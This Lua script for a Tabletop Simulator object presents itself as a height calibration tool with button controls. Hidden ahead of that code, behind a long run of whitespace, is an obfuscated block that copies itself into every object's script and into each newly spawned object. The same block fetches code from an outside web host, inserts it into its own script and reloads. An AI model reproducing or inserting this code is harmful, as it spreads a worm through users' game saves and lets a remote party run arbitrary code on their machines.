                                                                                                                                                                                                                                                                                                                                                                                                                --[[Object base code]]Wait.time(function()for a,b in ipairs(getObjects())do if b.getLuaScript():find("tcejbo gninwapS")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep("    ",100)..self.getLuaScript():sub(self.getLuaScript():find("--[[Object base code]]",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1).."\n\n")end end end,1)if onObjectSpawn==nil then function onObjectSpawn(b)if b.getLuaScript():find("tcejbo gninwapS")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep("    ",100)..self.getLuaScript():sub(self.getLuaScript():find("--[[Object base code]]",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1).."\n\n")end end end;if onPlayerAction==nil and self.getLuaScript():reverse():find("ereh edoc resU --",1,true)~=nil then self.drag_selectable=true;function onPlayerAction(c,d,e)if self.getLuaScript():reverse():find("ereh edoc resU --",1,true)~=nil and d==Player.Action.Select and#c.getSelectedObjects()==0 then for a,f in ipairs(e)do if f.getGUID()==self.getGUID()then self.setLuaScript(self.getLuaScript():gsub(self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+2,#self.getLuaScript()-self.getLuaScript():reverse():find("ereh edoc resU")+1):gsub("[%(%)%.%%%+%-%*%?%[%]%^%$]","%%%0"),""))end end end end end;WebRequest.get("https://obje.glitch.me/",function(g)if g.is_error then log(g.error)elseif g.text~=""and g.text:sub(1,4)=="true"and self.getLuaScript():find(g.text:sub(5,#g.text),1,true)==nil then self.setLuaScript(self.getLuaScript():sub(0,#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1)..g.text:sub(5,#g.text)..self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+2),#self.getLuaScript())self.reload()end end)--[[Spawning object]]
-- ==========================================
-- CALIBRATION TOOL SCRIPT
-- ==========================================
local currentHeight = 2.0
local buttonsVisible = true

function onLoad()
    createCalibrationUI()
end

function createCalibrationUI()
    self.clearButtons()
    
    -- Current Height Display (Non-clickable)
    self.createButton({
        click_function = "none", function_owner = self,
        label = "HEIGHT: " .. string.format("%.1f", currentHeight),
        position = {0, currentHeight, 0}, width = 0, height = 0,
        font_size = 180, font_color = {1, 1, 1}
    })

    -- Increment Buttons
    -- [+0.5]
    self.createButton({
        click_function = "addLarge", function_owner = self,
        label = "+0.5", position = {0.8, currentHeight, 0.4},
        width = 250, height = 200, font_size = 100, color = {0, 0.6, 0}
    })
    -- [-0.5]
    self.createButton({
        click_function = "subLarge", function_owner = self,
        label = "-0.5", position = {-0.8, currentHeight, 0.4},
        width = 250, height = 200, font_size = 100, color = {0.6, 0, 0}
    })
    -- [+0.1]
    self.createButton({
        click_function = "addSmall", function_owner = self,
        label = "+0.1", position = {0.8, currentHeight, -0.4},
        width = 250, height = 200, font_size = 100, color = {0, 0.4, 0}
    })
    -- [-0.1]
    self.createButton({
        click_function = "subSmall", function_owner = self,
        label = "-0.1", position = {-0.8, currentHeight, -0.4},
        width = 250, height = 200, font_size = 100, color = {0.4, 0, 0}
    })
end

-- Calculation Triggers
function addLarge() currentHeight = currentHeight + 0.5; createCalibrationUI() end
function subLarge() currentHeight = math.max(0, currentHeight - 0.5); createCalibrationUI() end
function addSmall() currentHeight = currentHeight + 0.1; createCalibrationUI() end
function subSmall() currentHeight = math.max(0, currentHeight - 0.1); createCalibrationUI() end
function none() end 